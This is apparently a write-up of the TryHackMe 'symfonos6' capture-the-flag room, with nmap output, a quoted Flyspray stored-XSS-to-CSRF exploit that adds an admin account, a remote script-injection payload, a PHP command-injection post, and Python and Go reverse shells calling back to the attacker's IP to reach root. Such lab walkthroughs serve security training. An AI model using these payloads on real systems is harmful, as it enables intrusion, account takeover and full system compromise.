# symfonos6

This VM was designed to search for the attackers "Achilles' heel"

[symfonos6](https://tryhackme.com/room/symfonos6)

## Topic's

- Network Enumeration
- Web Enumeration
- Cross-site Scripting
- Stored Passwords & Keys
- Code Injection
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Symfonos6

Hack into symfonos6

```
kali@kali:~/CTFs/tryhackme/symfonos6$ sudo nmap -A -sS -sC -sV -O 10.10.207.173
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 18:53 CEST
Nmap scan report for 10.10.207.173
Host is up (0.035s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)
|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)
|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=2fb5e7b797734900; Path=/; HttpOnly
|     Set-Cookie: _csrf=OAetB18nAeyWgbp8oaMPVmD3e706MTYwMzIxMjgwMDA1MjgwMjk1OA; Path=/; Expires=Wed, 21 Oct 2020 16:53:20 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 20 Oct 2020 16:53:20 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=dc2ec37d2b689788; Path=/; HttpOnly
|     Set-Cookie: _csrf=pKa9MbFDQGIN_2kjvtQM7zXJ-006MTYwMzIxMjgwNTM0OTAzMTYzOA; Path=/; Expires=Wed, 21 Oct 2020 16:53:25 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 20 Oct 2020 16:53:25 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Tue, 20 Oct 2020 16:53:51 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Tue, 20 Oct 2020 16:53:20 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Tue, 20 Oct 2020 16:53:35 GMT
|     Content-Length: 18
|_    page not found
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.80%I=7%D=10/20%Time=5F8F15FE%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2924,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=2fb5e7b797734900
SF:;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=OAetB18nAeyWgbp8oaMPVm
SF:D3e706MTYwMzIxMjgwMDA1MjgwMjk1OA;\x20Path=/;\x20Expires=Wed,\x2021\x20O
SF:ct\x202020\x2016:53:20\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEO
SF:RIGIN\r\nDate:\x20Tue,\x2020\x20Oct\x202020\x2016:53:20\x20GMT\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en-US\">\n<head\x20data-suburl=\"\">
SF:\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"
SF:x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>\x20Symfonos6</titl
SF:e>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossori
SF:gin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker'\x
SF:20in\x20navigator\)\x20{\n\t\t\tnavigator\.serviceWorker\.register\('/s
SF:erviceworker\.js'\)\.then\(function\(registration\)\x20{\n\t\t\t\t\n\t\
SF:t\t\tconsole\.info\('ServiceWorker\x20registration\x20successful\x20wit
SF:h\x20scope:\x20',\x20registrat")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,216B,"HTTP/1\.0\
SF:x20404\x20Not\x20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\
SF:r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-C
SF:ookie:\x20i_like_gitea=dc2ec37d2b689788;\x20Path=/;\x20HttpOnly\r\nSet-
SF:Cookie:\x20_csrf=pKa9MbFDQGIN_2kjvtQM7zXJ-006MTYwMzIxMjgwNTM0OTAzMTYzOA
SF:;\x20Path=/;\x20Expires=Wed,\x2021\x20Oct\x202020\x2016:53:25\x20GMT;\x
SF:20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2020\x20
SF:Oct\x202020\x2016:53:25\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en-US\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\
SF:n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initi
SF:al-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"i
SF:e=edge\">\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Symfonos6</title>\
SF:n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin
SF:=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker'\x20i
SF:n\x20navigator\)\x20{\n\t\t\tnavigator\.serviceWorker\.register\('/serv
SF:iceworker\.js'\)\.then\(function\(registration\)\x20{\n\t\t\t\t\n\t\t\t
SF:\tconsole\.info\('ServiceWorker\x20registration\x20successful\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.80%I=7%D=10/20%Time=5F8F15FF%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConte
SF:nt-Type:\x20text/plain\r\nDate:\x20Tue,\x2020\x20Oct\x202020\x2016:53:2
SF:0\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found")%
SF:r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(HTTPOptions,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCo
SF:ntent-Type:\x20text/plain\r\nDate:\x20Tue,\x2020\x20Oct\x202020\x2016:5
SF:3:35\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20found
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(FourOhFourRequest,7F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nC
SF:ontent-Type:\x20text/plain\r\nDate:\x20Tue,\x2020\x20Oct\x202020\x2016:
SF:53:51\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x20page\x20not\x20foun
SF:d")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=44092%PV=Y%DS=2%DC=T%G=Y%TM=5F8F16
OS:67%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SEQ(SP=
OS:105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I
OS:%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11N
OS:W7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF
OS:%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   34.50 ms 10.8.0.1
2   34.77 ms 10.10.207.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.86 seconds
```

[http://10.10.207.173/flyspray/index.php?do=details&task_id=1](http://10.10.207.173/flyspray/index.php?do=details&task_id=1)

```
# Exploit Title: XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF add admin account)
# Date: 19/04/2017
# Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT
: https://www.openoffice.org
# Version: 1.0-rc4
# Tested on: Windows 7 x64 SP1 / Kali Linux


Description :

A vulnerability has been discovered in Flyspray , which can be
exploited by malicious people to conduct cross-site scripting attacks. Input
passed via the 'real_name' parameter to '/index.php?do=myprofile' is not
properly sanitised before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user's browser session in
context of an affected site.

The script is executed on the parameter page AND on any page that allow the
user to put a comment.


This XSS vector allow to execute scripts to gather the CSRF token

and submit a form to create a new admin


Here's the script :

var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form"
action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="
root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();

This will create a new admin account, hacker:12345678

POC video : *https://www.youtube.com/watch?v=eCf9a0QpnPs

Patch : No patch yet
```

![](./2020-10-20_19-05.png)

`"><script src="http://10.8.106.222/script.js" />`

```
 FS#2 - self hosted git service

I have configured gitea for our git needs internally!

Here are my creds in case anyone wants to check out our project!

achilles:h2sBr9gryBunKdF9
```

```
kali@kali:~/CTFs/tryhackme/symfonos6$ curl -s -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }'
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDM4MTkzMzAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.V75lZc-v3cPOtVNLTX8eaaFFdG5xHJmC73AEKl25exs",
  "user": { "display_name": "achilles", "id": 1, "username": "achilles" }
}
```

```json
{
  "exp": 1603819330,
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}

expires in 6 days and 23:58:52
```

```
kali@kali:~/CTFs/tryhackme/symfonos6$ TOKEN=$(curl -s -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }' | jq -r '.token')

kali@kali:~/CTFs/tryhackme/symfonos6$ curl -L -X POST "http://10.10.207.173:5000/ls2o4g/v1.0/posts" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" --data-raw '{"text": "system($_GET['cmd']);" }'
{"created_at":"2020-10-20T13:25:31.878258913-04:00","id":2,"text":"system($_GET[cmd]);","user":{"display_name":"achilles","id":1,"username":"achilles"}}
```

`/posts/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

```
kali@kali:~/CTFs/tryhackme/symfonos6$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.207.173] 46854
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ su achilles
su achilles
Password: h2sBr9gryBunKdF9
[achilles@symfonos6 posts]$ sudo -l
sudo -l
Matching Defaults entries for achilles on symfonos6:
    !visiblepw, always_set_home, match_group_by_gid, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.8.106.222:9002");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > shell.go`

```
kali@kali:~/CTFs/tryhackme/symfonos6$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.207.173] 43564
wc -c proof.txt
wc: proof.txt: No such file or directory
ls
3d5da415e54c13d53015b93a3412767a
go-build001399189
go-build820990350
shell.go
t.go
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
proof.txt
scripts
wc -c proof.txt
592 proof.txt
```

1. Initial version

`1.0-rc4`

2. wc -c proof.txt?

`592`
